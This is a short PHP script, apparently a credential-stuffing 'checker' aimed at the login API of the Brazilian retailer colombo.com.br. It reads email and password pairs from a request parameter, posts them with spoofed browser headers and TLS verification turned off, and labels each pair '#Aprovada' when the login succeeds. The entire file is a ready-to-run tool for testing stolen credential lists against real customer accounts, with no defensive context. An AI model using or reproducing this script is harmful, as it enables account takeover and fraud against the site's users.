<?php

error_reporting(0);

$cookies = tmpfile();

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

$lista = $_GET['lista'];

$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

if ((empty($email)) || (empty($senha))) {
	exit('<span class="badge badge-danger">#Reprovada </span><b> '.$lista.' </b><span class="badge badge-primary">Faltou algo nessa lista</span> <span class="badge badge-dark">Immensity_0</span><br>');
}

///////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.colombo.com.br/api/login");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().''.$cookies.'');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().''.$cookies.'');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/json',
'host: www.colombo.com.br',
'origin: https://www.colombo.com.br',
'referer: https://www.colombo.com.br/a',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
'x-requested-with: XMLHttpRequest'

  ));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usuario":"'.$email.'","senha":"'.$senha.'","lembrar":true}'); 

   $end = curl_exec($ch);

   $msg = getStr($end, '"mensagem":"','"');
unlink($cookies);
if (strpos($end, '"id"')!== false) {
	exit('<span class="badge badge-success">#Aprovada </span><b> '.$lista.' </b><span class="badge badge-primary">Retorno: Logado com Sucesso </span> <span class="badge badge-dark">Immensity_0</span><br>');
}else{
	exit('<b><span class="badge badge-danger">#Reprovada </span> '.$lista.' <span class="badge badge-primary"></span>Retorno: '.$msg.' <span class="badge badge-dark">Immensity_0</span></b><br>');
}


?>
